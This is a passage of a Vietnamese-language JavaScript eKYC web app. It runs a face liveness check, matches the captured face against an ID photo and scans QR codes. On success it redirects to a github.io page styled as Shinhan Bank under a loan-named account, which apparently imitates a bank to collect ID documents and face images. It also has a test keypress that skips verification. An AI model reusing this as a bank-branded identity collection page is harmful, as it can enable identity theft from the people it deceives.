            this.dom.infoDob.textContent = this.state.extractedInfo.dateOfBirth || 'Đang xử lý...';
        }
    }

    // Video Tutorial
    showVideoTutorial() {
        this.showView('videoTutorialView');
        this.updateStepper(this.languages[this.currentLang].stepper_step4);
        this.updateProgressBar(4);
        
        if (this.dom.tutorialVideo) {
            this.dom.tutorialVideo.play().catch(console.error);
        }
    }

    // Enhanced Face Capture and Liveness
    async startFaceCapture() {
        this.showView('faceCaptureView');
        
        // Reset face capture states
        this.state.livenessStep = 0;
        this.state.livenessCompleted = false;
        this.state.faceDetectionInterval = null;
        
        this.updateProgressBar(4);
        this.updateStepper(this.languages[this.currentLang].stepper_step4);
        
        try {
            await this.initializeCamera('face');
            this.startLivenessCheck();
        } catch (error) {
            console.error('Face camera initialization failed:', error);
            this.showErrorModal(
                'Lỗi Camera Khuôn Mặt', 
                'Không thể khởi tạo camera để xác thực khuôn mặt. Vui lòng kiểm tra quyền truy cập camera và thử lại.'
            );
        }
    }

    // Legacy method for backward compatibility
    async initFaceCamera() {
        return this.initializeCamera('face');
    }

    startLivenessCheck() {
        this.updateLivenessStep(0);
        
        const steps = ['straight', 'smile', 'right', 'left'];
        let currentStep = 0;
        this.state.currentLivenessAction = steps[currentStep];

        // Non-optimized polling for liveness actions
        this.state.livenessInterval = setInterval(async () => {
            if (!this.dom.faceCameraVideo) return;

            const detection = await faceapi.detectSingleFace(this.dom.faceCameraVideo)
                .withFaceLandmarks()
                .withFaceExpressions();

            if (detection) {
                let actionCompleted = false;
                switch (this.state.currentLivenessAction) {
                    case 'straight':
                        // Simple: face detected and neutral
                        if (detection.expressions.neutral > 0.7) actionCompleted = true;
                        break;
                    case 'smile':
                        if (detection.expressions.happy > 0.7) actionCompleted = true;
                        break;
                    case 'right':
                        // Non-optimized pose check: use landmarks for rough turn (nose x shifted)
                        const landmarks = detection.landmarks;
                        const nose = landmarks.getNose()[0].x;
                        const jawLeft = landmarks.getJawOutline()[0].x;
                        const jawRight = landmarks.getJawOutline()[landmarks.getJawOutline().length - 1].x;
                        if (nose > (jawLeft + jawRight) / 2 + 50) actionCompleted = true; // Rough right turn
                        break;
                    case 'left':
                        const landmarksLeft = detection.landmarks;
                        const noseLeft = landmarksLeft.getNose()[0].x;
                        const jawLeftLeft = landmarksLeft.getJawOutline()[0].x;
                        const jawRightLeft = landmarksLeft.getJawOutline()[landmarksLeft.getJawOutline().length - 1].x;
                        if (noseLeft < (jawLeftLeft + jawRightLeft) / 2 - 50) actionCompleted = true; // Rough left turn
                        break;
                }

                if (actionCompleted) {
                    this.updateLivenessStep(currentStep + 1);
                    currentStep++;
                    this.state.currentLivenessAction = steps[currentStep];
                    if (currentStep >= steps.length) {
                        clearInterval(this.state.livenessInterval);
                        this.completeLivenessCheck();
                    }
                }
            }
        }, this.config.FACE_DETECTION_INTERVAL);
    }

    updateLivenessStep(stepIndex) {
        this.dom.livenessSteps.forEach((step, index) => {
            step.classList.remove('active', 'completed', 'error');
            
            if (index < stepIndex) {
                step.classList.add('completed');
            } else if (index === stepIndex) {
                step.classList.add('active');
            }
        });

        const instructions = [
            'Nhìn thẳng vào camera',
            'Vui lòng mỉm cười',
            'Quay mặt sang phải',
            'Quay mặt sang trái',
            'Xác thực thành công!'
        ];

        if (this.dom.faceCaptureInstruction && instructions[stepIndex]) {
            this.dom.faceCaptureInstruction.textContent = instructions[stepIndex];
        }
    }

    async completeLivenessCheck() {
        this.state.livenessCompleted = true;
        this.updateLivenessStep(4);
        
        // Capture face image
        await this.captureFaceImage();
        
        if (this.dom.btnConfirmLiveness) {
            this.dom.btnConfirmLiveness.disabled = false;
        }

        if (this.state.faceCameraStream) {
            this.state.faceCameraStream.getTracks().forEach(track => track.stop());
            this.state.faceCameraStream = null;
        }
    }

    // Enhanced face image capture for comparison
    async captureFaceImage() {
        try {
            const canvas = this.dom.faceCameraCanvas;
            const video = this.dom.faceCameraVideo;
            
            // Validate elements exist
            if (!canvas || !video) {
                throw new Error('Canvas hoặc video element không tồn tại');
            }

            // Check if video is ready
            if (video.videoWidth === 0 || video.videoHeight === 0) {
                throw new Error('Camera chưa sẵn sàng. Vui lòng đợi camera khởi tạo.');
            }
            
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Higher quality image capture
            const faceImageData = canvas.toDataURL('image/jpeg', 0.95);
            
            // Validate image data
            if (!faceImageData || faceImageData === 'data:,') {
                throw new Error('Không thể chụp dữ liệu ảnh');
            }
            
            this.state.capturedImages.face = faceImageData;

            // Enhanced face image quality check
            const faceQualityCheck = await this.checkImageQuality(faceImageData, 'face');
            this.state.imageQualityChecks.face = faceQualityCheck;
            
            if (!faceQualityCheck.isValid) {
                this.showFaceErrorModal(faceQualityCheck.errors);
                // Restart liveness check after delay
                setTimeout(() => {
                    this.startLivenessCheck();
                }, 3000);
                return;
            }

            // Extract live face descriptor (non-optimized)
            this.state.faceDescriptorLive = await this.getFaceDescriptor(faceImageData);
        } catch (error) {
            console.error('Face capture failed:', error);
            this.showErrorModal(
                'Lỗi Chụp Ảnh Khuôn Mặt', 
                `Không thể chụp ảnh khuôn mặt: ${error.message}. Vui lòng thử lại.`
            );
        }
    }

    // Enhanced face error modal
    showFaceErrorModal(errors) {
        const errorList = errors.map(error => `<li>${error}</li>`).join('');
        this.showConfirmationModal(
            'Chất Lượng Ảnh Khuôn Mặt Không Đạt',
            `
                <div class="face-error-details">
                    <p>Chất lượng ảnh khuôn mặt không đạt yêu cầu:</p>
                    <ul>${errorList}</ul>
                    <p>Vui lòng thực hiện lại quá trình xác thực khuôn mặt.</p>
                </div>
            `,
            [
                {
                    text: 'Thử Lại',
                    class: 'btn-retry',
                    action: () => this.hideConfirmationModal()
                }
            ]
        );
    }


    // Final Review View
    async showFinalReview() {
        this.showView('finalReviewView');
        this.updateStepper('Bước 5/5: Xem lại thông tin');
        this.updateProgressBar(5);
        
        // Populate review data
        this.populateReviewData();
        
        // Perform face matching
        await this.performFaceMatching();
    }

    // Populate review data
    populateReviewData() {
        // Set images
        if (this.dom.reviewFrontImg && this.state.capturedImages.front) {
            this.dom.reviewFrontImg.src = this.state.capturedImages.front;
        }
        
        if (this.dom.reviewBackImg && this.state.capturedImages.back) {
            this.dom.reviewBackImg.src = this.state.capturedImages.back;
        } else if (this.dom.reviewBackItem && !this.needsBackCapture()) {
            this.dom.reviewBackItem.style.display = 'none';
        }
        
        if (this.dom.reviewFaceImg && this.state.capturedImages.face) {
            this.dom.reviewFaceImg.src = this.state.capturedImages.face;
        }

        // Set quality indicators
        this.setQualityIndicator('frontQuality', this.state.imageQualityChecks.front);
        if (this.needsBackCapture()) {
            this.setQualityIndicator('backQuality', this.state.imageQualityChecks.back);
        }
        this.setQualityIndicator('faceQuality', this.state.imageQualityChecks.face);

        // Set extracted information
        if (this.dom.reviewIdNumber) {
            this.dom.reviewIdNumber.textContent = this.state.extractedInfo.idNumber || 'Đang xử lý...';
        }
        if (this.dom.reviewFullName) {
            this.dom.reviewFullName.textContent = this.state.extractedInfo.fullName || 'Đang xử lý...';
        }
        if (this.dom.reviewDob) {
            this.dom.reviewDob.textContent = this.state.extractedInfo.dateOfBirth || 'Đang xử lý...';
        }
    }

    // Set quality indicator
    setQualityIndicator(elementId, qualityCheck) {
        const element = this.dom[elementId];
        if (!element || !qualityCheck) return;

        if (qualityCheck.isValid) {
            element.textContent = 'Chất lượng tốt';
            element.className = 'quality-indicator good';
        } else {
            element.textContent = 'Cần cải thiện';
            element.className = 'quality-indicator warning';
        }
    }

    // Enhanced face matching with FaceAPI descriptors
    async performFaceMatching() {
        this.showLoading('Đang so sánh khuôn mặt...');
        
        try {
            let matchScore = 0;
            if (this.state.faceDescriptorDocument && this.state.faceDescriptorLive) {
                const distance = faceapi.euclideanDistance(this.state.faceDescriptorDocument, this.state.faceDescriptorLive);
                matchScore = Math.max(0, Math.min(100, 100 * (1 - distance))); // Clamped 0-100
            }
            this.state.faceMatchScore = matchScore;
            
            this.hideLoading();
            this.displayMatchResult(matchScore);
        } catch (error) {
            console.error('Face matching error:', error);
            this.hideLoading();
            this.showErrorModal(
                'Lỗi So Sánh Khuôn Mặt',
                'Không thể thực hiện so sánh khuôn mặt. Vui lòng thử lại.'
            );
        }
    }

    // Enhanced display match result without alerts
    displayMatchResult(score) {
        const roundedScore = Math.round(score);
        
        if (this.dom.scoreValue) {
            this.dom.scoreValue.textContent = roundedScore + '%';
        }

        const scoreCircle = this.dom.matchScore?.querySelector('.score-circle');
        const scoreLabel = this.dom.scoreLabel;
        const matchDetails = this.dom.matchDetails;

        if (scoreCircle) {
            // Set CSS custom property for animation
            scoreCircle.style.setProperty('--score-angle', (score * 3.6) + 'deg');
        }

        if (score >= 60) {
            // Success
            if (scoreCircle) scoreCircle.className = 'score-circle success';
            if (scoreLabel) {
                scoreLabel.textContent = 'Xác thực thành công';
                scoreLabel.className = 'score-label success';
            }
            if (matchDetails) {
                matchDetails.innerHTML = `
                    <p>Khuôn mặt trong ảnh xác thực khớp với ảnh trong giấy tờ (${roundedScore}%).</p>
                    <p>Bạn có thể tiếp tục hoàn tất quá trình xác thực.</p>
                `;
            }
        } else {
            // Failure
            if (scoreCircle) scoreCircle.className = 'score-circle error';
            if (scoreLabel) {
                scoreLabel.textContent = 'Xác thực không thành công';
                scoreLabel.className = 'score-label error';
            }
            if (matchDetails) {
                matchDetails.innerHTML = `
                    <p>Khuôn mặt trong ảnh xác thực không khớp đủ với ảnh trong giấy tờ (${roundedScore}%).</p>
                    <p>Yêu cầu tối thiểu: 60%. Vui lòng thực hiện lại quá trình xác thực.</p>
                `;
            }
            // Show retry option instead of alert
            this.showMatchFailureModal(roundedScore);
        }
    }

    // Success View
    showSuccess() {
        this.showView('successView');
        
        if (this.successAnimation) {
            this.successAnimation.play();
        }
    }

    // QR Scanner
    async startQRScan() {
        this.showView('qrScannerModal');
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    facingMode: 'environment'
                }
            });

            this.state.qrStream = stream;
            if (this.dom.qrVideo) {
                this.dom.qrVideo.srcObject = stream;
                await this.dom.qrVideo.play();
            }

            this.startQRDetection();
        } catch (error) {
            console.error('QR camera access failed:', error);
            this.cancelQRScan();
        }
    }

    startQRDetection() {
        const detectQR = () => {
            if (this.state.qrStream && this.dom.qrVideo) {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = this.dom.qrVideo.videoWidth;
                canvas.height = this.dom.qrVideo.videoHeight;
                ctx.drawImage(this.dom.qrVideo, 0, 0);
                
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                
                if (typeof jsQR !== 'undefined') {
                    const code = jsQR(imageData.data, imageData.width, imageData.height);
                    if (code) {
                        this.handleQRDetected(code.data);
                        return;
                    }
                }
                
                requestAnimationFrame(detectQR);
            }
        };
        
        detectQR();
    }

    handleQRDetected(qrData) {
        console.log('QR Code detected:', qrData);
        this.cancelQRScan();
        
        this.state.extractedInfo = {
            idNumber: 'QR-' + Date.now(),
            fullName: 'QR User',
            dateOfBirth: '01/01/1990'
        };
        
        this.showConfirmation();
    }

    cancelQRScan() {
        if (this.state.qrStream) {
            this.state.qrStream.getTracks().forEach(track => track.stop());
            this.state.qrStream = null;
        }
        
        this.showView('docSelectView');
    }

    // Navigation
    goBack() {
        switch (this.state.currentView) {
            case 'captureView':
                this.stopCamera();
                this.showView('docSelectView');
                this.updateStepper(this.languages[this.currentLang].stepper_step1);
                break;
            case 'confirmView':
                this.startCapture();
                break;
            case 'faceCaptureView':
                this.showView('videoTutorialView');
                break;
            default:
                this.showView('docSelectView');
                this.updateStepper(this.languages[this.currentLang].stepper_step1);
        }
    }

    // Retake functionality
    handleRetake(e) {
        const retakeType = e.currentTarget.dataset.retake;
        this.state.captureStep = retakeType;
        this.startCapture();
    }

    // Fullscreen image
    showFullscreenImage(e) {
        const imgSrc = e.currentTarget.src;
        if (this.dom.fullscreenModal && this.dom.fullscreenImage) {
            this.dom.fullscreenImage.src = imgSrc;
            this.dom.fullscreenModal.classList.remove('hidden');
        }
    }

    // Keyboard handling
    handleKeydown(e) {
        if (e.key === 'Escape') {
            if (this.dom.fullscreenModal && !this.dom.fullscreenModal.classList.contains('hidden')) {
                this.dom.fullscreenModal.classList.add('hidden');
            }
            
            ['cccdGuideModal', 'passportGuideModal', 'driverLicenseGuideModal'].forEach(modalId => {
                this.hideModal(modalId);
            });
        }
        
        // Test shortcut: Press 'T' to jump to success view for testing
        if (e.key === 't' || e.key === 'T') {
            this.testJumpToSuccess();
        }
    }

    // Test function to jump to final review view
    testJumpToSuccess() {
        // Set mock data
        this.state.extractedInfo = {
            idNumber: '123456789012',
            fullName: 'NGUYỄN VĂN A',
            dateOfBirth: '01/01/1990'
        };
        
        // Set mock captured images (base64 placeholder)
        const mockImageData = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=';
        
        this.state.capturedImages = {
            front: mockImageData,
            back: mockImageData,
            face: mockImageData
        };
        
        // Set mock quality checks
        this.state.imageQualityChecks = {
            front: { isValid: true, errors: [], confidence: 0.95 },
            back: { isValid: true, errors: [], confidence: 0.92 },
            face: { isValid: true, errors: [], confidence: 0.88 }
        };
        
        // Show final review view
        this.showFinalReview();
        
        console.log('Test mode: Jumped to final review view. Check face matching and final submission.');
    }

    // Loading and Error handling
    showLoading(message) {
        if (this.dom.loadingOverlay) {
            this.dom.loadingOverlay.classList.remove('hidden');
            const loadingText = this.dom.loadingOverlay.querySelector('.loading-text');
            if (loadingText) {
                loadingText.textContent = message;
            }
            if (this.loadingAnimation) {
                this.loadingAnimation.play();
            }
        }
    }

    hideLoading() {
        if (this.dom.loadingOverlay) {
            this.dom.loadingOverlay.classList.add('hidden');
            if (this.loadingAnimation) {
                this.loadingAnimation.stop();
            }
        }
    }

    showError(message) {
        if (this.dom.errorMessage) {
            this.dom.errorMessage.textContent = message;
            this.dom.errorMessage.classList.add('visible');
            
            setTimeout(() => {
                this.dom.errorMessage.classList.remove('visible');
            }, this.config.ERROR_MESSAGE_TIMEOUT);
        }
    }

    // Enhanced error modal for better user experience
    showErrorModal(title, message) {
        this.showConfirmationModal(
            title,
            `<div class="error-details"><p>${message}</p></div>`,
            [
                {
                    text: 'Đóng',
                    class: 'btn-close',
                    action: () => this.hideConfirmationModal()
                }
            ]
        );
    }

    // Match failure modal
    showMatchFailureModal(score) {
        this.showConfirmationModal(
            'Xác Thực Khuôn Mặt Không Thành Công',
            `
                <div class="match-failure-details">
                    <p>Điểm số so sánh: <strong>${score}%</strong></p>
                    <p>Yêu cầu tối thiểu: <strong>60%</strong></p>
                    <p>Vui lòng thực hiện lại quá trình xác thực để cải thiện độ chính xác.</p>
                </div>
            `,
            [
                {
                    text: 'Thử Lại',
                    class: 'btn-retry',
                    action: () => {
                        this.hideConfirmationModal();
                        this.retryVerification();
                    }
                },
                {
                    text: 'Hủy',
                    class: 'btn-cancel',
                    action: () => this.hideConfirmationModal()
                }
            ]
        );
    }

    // Generic confirmation modal
    showConfirmationModal(title, content, buttons) {
        // Create modal if it doesn't exist
        let modal = document.getElementById('confirmationModal');
        if (!modal) {
            modal = this.createConfirmationModal();
        }

        // Update modal content
        const modalTitle = modal.querySelector('.modal-title');
        const modalContent = modal.querySelector('.modal-body');
        const modalActions = modal.querySelector('.modal-actions');

        if (modalTitle) modalTitle.textContent = title;
        if (modalContent) modalContent.innerHTML = content;
        
        // Clear and add buttons
        if (modalActions) {
            modalActions.innerHTML = '';
            buttons.forEach(button => {
                const btn = document.createElement('button');
                btn.textContent = button.text;
                btn.className = `btn-custom ${button.class}`;
                btn.addEventListener('click', button.action);
                modalActions.appendChild(btn);
            });
        }

        // Show modal
        modal.classList.remove('hidden');
        document.body.style.overflow = 'hidden';
    }

    // Hide confirmation modal
    hideConfirmationModal() {
        const modal = document.getElementById('confirmationModal');
        if (modal) {
            modal.classList.add('hidden');
            document.body.style.overflow = 'auto';
        }
    }

    // Create confirmation modal dynamically
    createConfirmationModal() {
        const modal = document.createElement('div');
        modal.id = 'confirmationModal';
        modal.className = 'modal-overlay confirmation-modal hidden';
        modal.innerHTML = `
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title"></h3>
                    <button class="modal-close-btn" onclick="this.closest('.modal-overlay').classList.add('hidden'); document.body.style.overflow = 'auto';">×</button>
                </div>
                <div class="modal-body"></div>
                <div class="modal-actions"></div>
            </div>
        `;
        document.body.appendChild(modal);
        return modal;
    }

    // Enhanced final confirmation with modal feedback
    finalConfirm() {
        this.showLoading('Đang gửi thông tin...');
        
        // Check face match score
        setTimeout(() => {
            this.hideLoading();
            
            if (this.state.faceMatchScore >= 60) {
                // Face match successful - show success modal
                this.handleVerificationSuccess();
            } else {
                // Face match failed - show failure modal
                this.handleFaceMatchFailure();
            }
        }, 2000);
    }

    // Enhanced face match failure handling with modal
    handleFaceMatchFailure() {
        this.showConfirmationModal(
            'Xác Thực Không Thành Công',
            `
                <div class="failure-details">
                    <p><strong>Điểm số so sánh:</strong> ${Math.round(this.state.faceMatchScore)}%</p>
                    <p><strong>Yêu cầu tối thiểu:</strong> 60%</p>
                    
                    <div class="failure-reasons">
                        <p><strong>Nguyên nhân có thể do:</strong></p>
                        <ul>
                            <li>Ảnh khuôn mặt không rõ nét</li>
                            <li>Góc chụp không phù hợp</li>
                            <li>Ánh sáng không đủ</li>
                            <li>Khuôn mặt trong giấy tờ không rõ</li>
                        </ul>
                    </div>
                    
                    <p>Bạn có muốn thực hiện lại quá trình xác thực không?</p>
                </div>
            `,
            [
                {
                    text: 'Thử Lại',
                    class: 'btn-retry',
                    action: () => this.retryVerification()
                },
                {
                    text: 'Hủy',
                    class: 'btn-cancel',
                    action: () => this.showErrorModal('Xác Thực Đã Hủy', 'Vui lòng thử lại sau.')
                }
            ]
        );
    }

    // Enhanced successful verification handling with modal
    handleVerificationSuccess() {
        this.showConfirmationModal(
            'Xác Thực Thành Công!',
            `
                <div class="success-details">
                    <p>Xác thực eKYC hoàn tất thành công!</p>
                    <p>Điểm số so sánh: <strong>${Math.round(this.state.faceMatchScore)}%</strong></p>
                    <p>Đang chuyển đến bước tiếp theo...</p>
                </div>
            `,
            [
                {
                    text: 'Tiếp Tục',
                    class: 'btn-success',
                    action: () => {
                        setTimeout(() => {
                            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
                        }, 1000);
                    }
                }
            ]
        );
    }

    // Handle verification failure
    handleVerificationFailure() {
        // Show error message with retry option
        const retryConfirm = confirm(
            'Xác thực không thành công. Có thể do:\n' +
            '• Hình ảnh không rõ nét\n' +
            '• Thông tin không khớp\n' +
            '• Lỗi kết nối\n\n' +
            'Bạn có muốn thử lại không?'
        );
        
        if (retryConfirm) {
            // Reset to document selection to start over
            this.retryVerification();
        } else {
            // User chose not to retry, stay on success view
            this.showError('Xác thực đã bị hủy. Vui lòng thử lại sau.');
        }
    }

    // Retry verification process
    retryVerification() {
        // Reset state
        this.initState();
        
        // Show document selection view
        this.showView('docSelectView');
        this.updateStepper(this.languages[this.currentLang].stepper_step1);
        
        // Show retry message
        this.showError('Đang khởi động lại quá trình xác thực. Vui lòng chọn loại giấy tờ.');
    }

    // Handle guide link click
    handleGuideLinkClick(e) {
        e.preventDefault();
        
        // Show appropriate guide modal based on selected document type
        switch (this.state.selectedDocType) {
            case 'cccd':
            case 'other':
                this.showModal('cccdGuideModal');
                break;
            case 'passport':
                this.showModal('passportGuideModal');
                break;
            case 'driver':
                this.showModal('driverLicenseGuideModal');
                break;
            default:
                // Default to CCCD guide if no document type selected
                this.showModal('cccdGuideModal');
        }
    }
}

// Initialize the application
new EkycApp();

});
